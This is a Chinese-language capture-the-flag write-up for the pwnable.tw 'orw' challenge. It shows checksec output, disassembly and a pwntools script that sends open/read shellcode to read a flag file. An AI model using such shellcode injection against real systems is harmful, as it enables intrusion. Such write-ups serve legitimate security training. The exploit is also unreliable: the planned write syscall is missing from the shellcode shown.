# ORW
----------
```
only read write open
syscall are allowed to use
read the flag from /home/orw/flag
```
> nc chall.pwnable.tw 10001

首先checksec
```
[*] '/root/pwn/pwnable.tw/orw/orw'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```
发现开启了Cannary，但是这个题目不存在栈溢出的问题，考点应该是shellcode的编写。
发现最下面一行有读写执行权限的段

放进IDA分析

发现逻辑相当简单。。
```
.text:08048548 ; int __cdecl main(int argc, const char **argv, const char **envp)
.text:08048548                 public main
.text:08048548 main            proc near               ; DATA XREF: _start+17↑o
.text:08048548
.text:08048548 var_4           = dword ptr -4
.text:08048548 argc            = dword ptr  8
.text:08048548 argv            = dword ptr  0Ch
.text:08048548 envp            = dword ptr  10h
.text:08048548
.text:08048548 ; __unwind {
.text:08048548                 lea     ecx, [esp+4]
.text:0804854C                 and     esp, 0FFFFFFF0h
.text:0804854F                 push    dword ptr [ecx-4]
.text:08048552                 push    ebp
.text:08048553                 mov     ebp, esp
.text:08048555                 push    ecx
.text:08048556                 sub     esp, 4
.text:08048559                 call    orw_seccomp
.text:0804855E                 sub     esp, 0Ch
.text:08048561                 push    offset format   ; "Give my your shellcode:"
.text:08048566                 call    _printf
.text:0804856B                 add     esp, 10h
.text:0804856E                 sub     esp, 4
.text:08048571                 push    0C8h            ; nbytes
.text:08048576                 push    offset shellcode ; buf
.text:0804857B                 push    0               ; fd
.text:0804857D                 call    _read
.text:08048582                 add     esp, 10h
.text:08048585                 mov     eax, offset shellcode
.text:0804858A                 call    eax ; shellcode
.text:0804858C                 mov     eax, 0
.text:08048591                 mov     ecx, [ebp+var_4]
.text:08048594                 leave
.text:08048595                 lea     esp, [ecx-4]
.text:08048598                 retn
.text:08048598 ; } // starts at 8048548
.text:08048598 main            endp
```

将读入的shellcode放到200大小的缓冲区中，然后，，执行。。。<br>
所以关键点在于构造shellcode<br>
```
构造思路为：
char *filename = '/home/orw/flag'

sys_open(filename,0,0);

sys_read(3,filename,0x30);

sys_write(1,filename,0x30);

于是用汇编表示出来
shellcode = ''

shellcode += asm('xor ecx,ecx;mov eax,0x5; push ecx;push 0x67616c66; push 0x2f77726f; push 0x2f656d6f; push 0x682f2f2f; mov ebx,esp;xor edx,edx;int 0x80;')

shellcode += asm('mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov dl,0x30;int 0x80;')

```
于是exploit编写如下：
```python
# coding = utf-8
# author = Mr.BeanX

from pwn import *

host = 'chall.pwnable.tw'
port = 10001

shellcode = ''

shellcode += asm('xor ecx,ecx;mov eax,0x5; push ecx;push 0x67616c66; push 0x2f77726f; push 0x2f656d6f; push 0x682f2f2f; mov ebx,esp;xor edx,edx;int 0x80;')

shellcode += asm('mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov dl,0x30;int 0x80;')

def exp():
    p = remote(host,port)
    p.recv()
    p.send(shellcode)
    print p.recv()

exp()

```
